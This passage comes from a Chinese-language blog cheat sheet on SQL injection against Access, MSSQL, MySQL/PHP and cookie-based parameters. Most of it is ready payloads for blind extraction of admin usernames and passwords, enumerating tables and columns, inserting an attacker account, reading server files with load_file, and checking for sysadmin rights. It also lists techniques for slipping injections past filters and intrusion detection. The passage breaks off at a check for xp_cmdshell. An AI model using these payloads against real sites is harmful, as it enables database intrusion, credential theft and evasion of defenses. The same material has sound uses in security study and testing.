class="line">当输入到<span class="number">109</span>时，显示错误，而<span class="number">108</span>之前显示正确，说明第一个字符的<span class="keyword">ASCII</span>码为<span class="number">109.</span>，得到第一个字符是m。</span><br><span class="line">同理<span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(username,<span class="number">2</span>，<span class="number">1</span>) <span class="keyword">from</span> <span class="keyword">Admin</span>)&gt;<span class="number">0</span>，<span class="number">1</span>，<span class="number">2</span>…</span><br><span class="line">到<span class="number">114</span>的时候不成立，说明第二个字符的<span class="keyword">ASCII</span>码值为<span class="number">114</span>，字符为r。</span><br><span class="line">注意的是英文和数字的<span class="keyword">ASCII</span>码在<span class="number">1</span><span class="number">-128</span>之间...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MSSQL注入：</span><br><span class="line"></span><br><span class="line"><span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">-- 【爆出一个表名及字段，如：列 'users.ID' 在选择列表中无效】</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> users.ID <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">-- </span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> users.ID, users.username, users.password, users.privs <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--</span></span><br><span class="line">; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>( <span class="number">666</span>, attacker, foobar, <span class="number">0xffff</span> )<span class="comment">-- 【插入新记录】</span></span><br><span class="line"></span><br><span class="line">猜解表名：</span><br><span class="line"><span class="keyword">SQL</span> <span class="keyword">SERVER</span>的每一个数据库都会有用户表和系统表，在系统表sysobjects中， 数据库内创建的每个对象（约束、默认值、日志、规则、存储过程等）在sysobjects表中占一行，那么也就是说当前数据库的表名都会在该表内有存在。 我们常用到的参数有三个，<span class="keyword">name</span> （数据表的名字），xtype（ 数据表的类型 u为用户表），<span class="keyword">id</span>（ 数据表的对象标志）。</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span>)&gt;<span class="number">0</span> (得到第一个表名:比如<span class="keyword">user</span>)</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">name</span> <span class="keyword">from</span> sysobjects <span class="keyword">where</span> xtype=<span class="string">'u'</span> <span class="keyword">and</span> <span class="keyword">name</span> <span class="keyword">not</span> <span class="keyword">in</span> (<span class="string">'user'</span>))&gt;<span class="number">0</span> 得到第二个表名，后面的以此类推。。</span><br><span class="line"></span><br><span class="line">猜解列名：</span><br><span class="line">用 到系统自带的<span class="number">2</span>个函数col_name()和object_id()，col_name()的格式是“COL_NAME( table_id , column_id )”，参数table_id是表的标识号，column_id是列的标识号，object_id(<span class="keyword">admin</span>)就是得到<span class="keyword">admin</span>在sysobjects 中的标识号，column_id=<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>表明<span class="keyword">admin</span>的第<span class="number">1</span>，<span class="number">2</span>，<span class="number">3</span>列。</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> col_name(object_id(<span class="string">'admin'</span>),<span class="number">1</span>) <span class="keyword">from</span> sysobjects)&gt;<span class="number">0</span> 【得到<span class="keyword">admin</span>字段的第一个列名“username”依次类推，得到“<span class="keyword">password</span>”“<span class="keyword">id</span>”等等】</span><br><span class="line"></span><br><span class="line">猜解字段内容：</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> username <span class="keyword">from</span> [<span class="keyword">admin</span>])&gt;<span class="number">0</span> 【直接得到用户名】</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">password</span> <span class="keyword">from</span> [<span class="keyword">admin</span>])&gt;<span class="number">0</span> 【直接得到密码】</span><br><span class="line"></span><br><span class="line"><span class="keyword">UNION</span>联合查询：</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">name</span>,<span class="keyword">password</span>,<span class="keyword">id</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="keyword">user</span>,pwd,uid <span class="keyword">from</span> 表名</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5.</span>.. <span class="keyword">from</span> 表名 (数值从<span class="number">1</span>开始慢慢加，如果加到<span class="number">5</span>返回正常，那就存在<span class="number">5</span>个字段)</span><br><span class="line"></span><br><span class="line"><span class="keyword">ASCII</span>逐字解码法：</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>、猜解列长度</span><br><span class="line"><span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(列名)<span class="keyword">from</span> 表名)&gt;N</span><br><span class="line">其中N是数字，变换这个N的值猜解列长度，当N为<span class="number">6</span>正确，为<span class="number">7</span>错误，则长度为<span class="number">7</span></span><br><span class="line">猜解第二条记录就该使用：<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">len</span>(列名) <span class="keyword">from</span> 表名 <span class="keyword">where</span> 列名 <span class="keyword">not</span> <span class="keyword">in</span> (<span class="keyword">select</span> top <span class="number">1</span> 列名 <span class="keyword">from</span> 表名)</span><br><span class="line"></span><br><span class="line"><span class="number">2</span>、猜解用户和密码</span><br><span class="line"><span class="keyword">ASC</span>()函数和<span class="keyword">Mid</span>函数,<span class="keyword">ASC</span>(<span class="keyword">mid</span>(列名,N,<span class="number">1</span>))得到“列名”第N位字符<span class="keyword">ASCII</span>码</span><br><span class="line">猜解语句为：<span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(字段,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> 数据库名)&gt;<span class="keyword">ASCII</span>码</span><br><span class="line">区间判断语句：....between......and......</span><br><span class="line">中文处理法:当<span class="keyword">ASCII</span>转换后为“负数”使用<span class="keyword">abs</span>()函数取绝对值。</span><br><span class="line">例：<span class="keyword">and</span> (<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">abs</span>(<span class="keyword">asc</span>(<span class="keyword">mid</span>(字段,<span class="number">1</span>,<span class="number">1</span>))) <span class="keyword">from</span> 数据库名)=<span class="keyword">ASC</span>码</span><br><span class="line"></span><br><span class="line"><span class="keyword">ASCII</span>逐字解码法的应用：</span><br><span class="line"><span class="number">1</span>、猜解表名：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span>)&lt;&gt;<span class="number">0</span></span><br><span class="line"><span class="number">2</span>、猜解列名：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(列名) <span class="keyword">from</span> 表名)&lt;&gt;<span class="number">0</span></span><br><span class="line"><span class="number">3</span>、猜解用户个数：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> 表名)&gt;<span class="number">1</span>,<span class="number">2.</span>. <span class="number">2</span>正常，<span class="number">3</span>错误，表中有<span class="number">3</span>条记录。</span><br><span class="line"><span class="number">4</span>、猜解用户名的长度：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">len</span>(列名) <span class="keyword">from</span> 表名)&gt;=<span class="number">1</span>、&gt;=<span class="number">2</span>、&gt;=<span class="number">3</span>、&gt;=<span class="number">4</span>。</span><br><span class="line"><span class="number">5</span>、猜解用户名：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*)<span class="keyword">from</span> 表名 <span class="keyword">where</span> (<span class="keyword">asc</span>(<span class="keyword">mid</span>(列名,<span class="number">1</span>,<span class="number">1</span>))) <span class="keyword">between</span> <span class="number">30</span> <span class="keyword">and</span> <span class="number">130</span>)&lt;&gt;<span class="number">0</span></span><br><span class="line">最后提交：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">asc</span>(<span class="keyword">mid</span>(列名,<span class="number">1</span>,<span class="number">1</span>)) <span class="keyword">from</span> 表名)=<span class="keyword">ascii</span>的值</span><br><span class="line"><span class="number">6</span>、猜解管理员的密码：</span><br><span class="line">按照上面的原理，把上面的语句中(<span class="keyword">asc</span>(<span class="keyword">mid</span>(列名,<span class="number">1</span>,<span class="number">1</span>)的列名换成<span class="keyword">PASSWORD</span>就能得到密码了。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">MYSQL+PHP注入：</span><br><span class="line"><span class="number">1.</span>判断是否存在注入,加 <span class="string">';and 1=1 ;and 1=2 </span></span><br><span class="line"><span class="string">2.判断版本 and ord(mid(version(),1,1))&gt;51 /* 返回正常说明是4.0以上版本，可以用union查询</span></span><br><span class="line"><span class="string">3.利用order by 暴字段，在网址后加 order by 10 /* 如果返回正常说明字段大于10</span></span><br><span class="line"><span class="string">4.再利用union来查询准确字段，如: and 1=2 union select 1,2,3,......./*直到返回正常，说明猜到准确字段数。如过滤了空格可以用/**/代替。</span></span><br><span class="line"><span class="string">5.判断数据库连接帐号有没有写权限，and (select count(*) from mysql.user)&gt;0 /*如果结果返回错误，那我们只能猜解管理员帐号和密码了。</span></span><br><span class="line"><span class="string">6. 如果返回正常，则可以通过and 1=2 union select 1,2,3,4,5,6,load_file(char(文件路径的ascii值，用逗号隔开)),8,9,10 /* 注：load_file(char(文件路径的ascii值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件，找到数据库连接等。</span></span><br><span class="line"><span class="string">7.首先猜解user表,如: and 1=2 union select 1,2,3,4,5,6.... from user /* 如果返回正常，说明存在这个表。</span></span><br><span class="line"><span class="string">8.知道了表就猜解字段,and 1=2 union select 1,username,3,4,5,6.... from user/*如果在2字段显示出字段内容则存在些字段。</span></span><br><span class="line"><span class="string">9.同理再猜解password字段。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ORACLE+ASP注入：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">http://www.freebuf.com/articles/web/5411.html</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">cookie注入:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">条件:ID=Request("ID")，（WEB服务器是先去取GET中的数据，没有的话再取POST中的数据,还没有再去取Cookies中的数据）；未对cookie进行过滤，那么就造成了cookie注入。</span></span><br><span class="line"><span class="string">----------用 Request.QueryString或Request.Form收集数据的话，是无法利用Cookies注入的---------</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断是否存在cookie注入</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">例如：http://www.xxx.com/1.asp?id=44</span></span><br><span class="line"><span class="string">输入：http://www.xxx.com/1.asp 显示不正常，因为没有输参数。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">javascript:alert(document.cookie="id="+escape("44 and 1=1"));刷新页面,显示正常,可以再试下一步(如果不正常,就有可能也有过滤了)</span></span><br><span class="line"><span class="string">javascript:alert(document.cookie="id="+escape("44 and 1=2"));刷新一下页面，如果不正常显示，这就表示有注入了。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">猜解长度:</span></span><br><span class="line"><span class="string">javascript:alert(document.cookie="id="+escape("44 and (select len(password) from admin)=16"))</span></span><br><span class="line"><span class="string">猜解内容:</span></span><br><span class="line"><span class="string">javascript:alert(document.cookie="id="+escape("44 and (select asc(mid(username)) from admin)=97"))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">PHP注入：</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">判断注入点：'</span>;and 1=1 ';and 1=2</span><br><span class="line">判断UNION：and ord(mid(version(),1,1))&gt;51 返回正确则4.0可用UNION查询</span><br><span class="line">利用order by 暴字段：order by n (n=1,2,3.. ) （当n为3正确，4错误是，则3个字段）</span><br><span class="line">利用union来查询准确字段：and 1=1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,....... （当返回正常时，就说明猜到准确字段数=最后一个数）</span><br><span class="line">判断数据库连接帐号有没有写权限：<span class="keyword">and</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span>（如果返回错误，我们就猜管理员的帐号密码，如果返回正常，则可以通过</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>, <span class="keyword">load_file</span>(<span class="built_in">char</span>(文件路径的<span class="keyword">ascii</span>值，用逗号隔开)),<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span> [注意：<span class="keyword">load_file</span>(<span class="built_in">char</span>(文件路径的<span class="keyword">ascii</span>值，用逗号隔开))也可以用十六进制，通过这种方式读取配置文件]）</span><br><span class="line">猜解表：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6.</span>... <span class="keyword">from</span> <span class="keyword">user</span> （回正常，说明存在这个表）</span><br><span class="line">猜字段：<span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,username,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6.</span>... <span class="keyword">from</span> <span class="keyword">user</span> （同样道理，自己替换，如果在<span class="number">2</span>字段显示出字段内容则存在些字段）</span><br><span class="line">同理再猜解<span class="keyword">password</span>字段。</span><br></pre></td></tr></table></figure></li></ol><h1 id="SQL绕过防注入系统方法"><a href="#SQL绕过防注入系统方法" class="headerlink" title="SQL绕过防注入系统方法"></a><font color="#3399FF">SQL绕过防注入系统方法</font></h1><hr><ol><li>运用编码技术绕过：<br>如URLEncode编码，ASCII编码绕过。例如or 1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</li><li>通过空格绕过：<br>如两个空格代替一个空格，用Tab代替空格等，或者删除所有空格，如<br>or’ swords’ =‘swords’，由于mssql的松散性，我们可以把or ‘swords’ 之间的空格去掉，并不影响运行。</li><li>运用字符串判断代替：<br>用经典的or 1=1判断绕过,如or ‘swords’ =’swords’，这个方法就是网上在讨论的。</li><li>通过类型转换修饰符N绕过：<br>可以说这是一个不错的想法，他除了能在某种程度上绕过限制，而且还有别的作用，大家自己好好想想吧。关于利用，如or ‘swords’ = N’ swords’ ，大写的N告诉mssql server 字符串作为nvarchar类型，它起到类型转换的作用，并不影响注射语句本身，但是可以避过基于知识的模式匹配IDS。</li><li>通过+号拆解字符串绕过：<br>效果值得考证，但毕竟是一种方法。如or ‘swords’ =‘sw’ +’ ords’ ；EXEC(‘IN’ +’ SERT INTO ‘+’ …..’ )</li><li>通过LIKE绕过：<br>如or’swords’ LIKE ‘sw’！！！可以很轻松的绕过“=”“&gt;”的限制。</li><li>通过IN绕过：<br>与上面的LIKE的思路差不多,如or ‘swords’ IN (‘swords’)</li><li>通过BETWEEN绕过：<br>如or ‘swords’ BETWEEN ‘rw’ AND ‘tw’</li><li>通过&gt;或者&lt;绕过：or ‘swords’ &gt; ‘sw’、or ‘swords’ &lt; ‘tw’、or 1&lt;3……</li><li>运用注释语句绕过：<br>用/星号星号/代替空格，如：UNION /星号星号/ Select /星号星号/user，pwd，from tbluser<br>用/星号星号/分割敏感词，如：U/星号星号/ NION /星号星号/ SE/星号星号/ LECT /星号星号/user，pwd from tbluser</li><li>用HEX绕过，一般的IDS都无法检测出来：<br>0x730079007300610064006D0069006E00 =hex(sysadmin)<br>0x640062005F006F0077006E0065007200 =hex(db_owner) </li></ol><h1 id="SQL注入常用语句场景"><a href="#SQL注入常用语句场景" class="headerlink" title="SQL注入常用语句场景"></a><font color="#3399FF">SQL注入常用语句场景</font></h1><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br></pre></td><td class="code"><pre><span class="line">1.判断有无注入点</span><br><span class="line">; and 1=1 and 1=2</span><br><span class="line">2.猜表一般的表的名称无非是admin adminuser user pass password 等..</span><br><span class="line">and 0&lt;&gt;(select count(*) from *)</span><br><span class="line">and 0&lt;&gt;(select count(*) from admin) ---判断是否存在admin这张表</span><br><span class="line">3.猜帐号数目 如果遇到0&lt; 返回正确页面， 1&lt;返回错误页面，说明帐号数目就是1个</span><br><span class="line">and 0&lt;(select count(*) from admin)</span><br><span class="line">and 1&lt;(select count(*) from admin)</span><br><span class="line">4.猜解字段名称 在len( ) 括号里面加上我们想到的字段名称.</span><br><span class="line">and 1=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(*)&gt;<span class="number">0</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>（用户字段名称<span class="keyword">name</span>)&gt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>（密码字段名称<span class="keyword">password</span>)&gt;<span class="number">0</span>)</span><br><span class="line"><span class="number">5.</span>猜解各个字段的长度 猜解长度就是把&gt;<span class="number">0</span>变换 直到返回正确页面为止</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(*)&gt;<span class="number">0</span>)</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(<span class="keyword">name</span>)&gt;<span class="number">6</span>) 错误</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(<span class="keyword">name</span>)&gt;<span class="number">5</span>) 正确 长度是<span class="number">6</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(<span class="keyword">name</span>)=<span class="number">6</span>) 正确</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(<span class="keyword">password</span>)&gt;<span class="number">11</span>) 正确</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(<span class="keyword">password</span>)&gt;<span class="number">12</span>) 错误 长度是<span class="number">12</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">len</span>(<span class="keyword">password</span>)=<span class="number">12</span>) 正确</span><br><span class="line"><span class="number">6.</span>猜解字符</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">left</span>(<span class="keyword">name</span>,<span class="number">1</span>)=a) <span class="comment">---猜解用户帐号的第一位</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="keyword">left</span>(<span class="keyword">name</span>,<span class="number">2</span>)=ab)<span class="comment">---猜解用户帐号的第二位</span></span><br><span class="line">就这样一次加一个字符这样猜，猜到够你刚才猜出来的多少位了就对了，帐号就算出来了</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> top <span class="number">1</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">Admin</span> <span class="keyword">where</span> <span class="keyword">Asc</span>(<span class="keyword">mid</span>(pass,<span class="number">5</span>,<span class="number">1</span>))=<span class="number">51</span>) <span class="comment">--</span></span><br><span class="line">这个查询语句可以猜解中文的用户和密码.只要把后面的数字换成中文的ASSIC码就OK.最后把结果再转换成字符.</span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> users. <span class="keyword">id</span> <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--</span></span><br><span class="line"><span class="keyword">group</span> <span class="keyword">by</span> users. <span class="keyword">id</span>,users.username,users.password,users.privs <span class="keyword">having</span> <span class="number">1</span>=<span class="number">1</span><span class="comment">--</span></span><br><span class="line">; <span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">users</span> <span class="keyword">values</span>( <span class="number">666</span>,attacker,foobar,<span class="number">0xffff</span> )<span class="comment">--</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TOP <span class="number">1</span> COLUMN_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME=logintable-</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TOP <span class="number">1</span> COLUMN_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME=logintable <span class="keyword">WHERE</span> COLUMN_NAME <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">(login_id)-</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TOP <span class="number">1</span> COLUMN_NAME <span class="keyword">FROM</span> INFORMATION_SCHEMA.COLUMNS <span class="keyword">WHERE</span> TABLE_NAME=logintable <span class="keyword">WHERE</span> COLUMN_NAME <span class="keyword">NOT</span> <span class="keyword">IN</span></span><br><span class="line">(login_id,login_name)-</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TOP <span class="number">1</span> login_name <span class="keyword">FROM</span> logintable-</span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> TOP <span class="number">1</span> <span class="keyword">password</span> <span class="keyword">FROM</span> logintable <span class="keyword">where</span> login_name=Rahul<span class="comment">--</span></span><br><span class="line">看服务器打的补丁=出错了打了SP4补丁</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">select</span> @@<span class="keyword">VERSION</span>)<span class="comment">--</span></span><br><span class="line">看数据库连接账号的权限，返回正常，证明是服务器角色sysadmin权限。</span><br><span class="line"><span class="keyword">and</span> <span class="number">1</span>=(<span class="keyword">SELECT</span> IS_SRVROLEMEMBER(sysadmin))<span class="comment">--</span></span><br><span class="line">判断连接数据库帐号。（采用SA账号连接 返回正常=证明了连接账号是SA）</span><br><span class="line"><span class="keyword">and</span> sa=(<span class="keyword">SELECT</span> <span class="keyword">System_user</span>)<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> user_name()=dbo<span class="comment">--</span></span><br><span class="line"><span class="keyword">and</span> <span class="number">0</span>&lt;&gt;(<span class="keyword">select</span> user_name()<span class="comment">--</span></span><br><span class="line">看xp_cmdshell是否删除</span><br><span class="line"><span class="keyword">and</span> <span 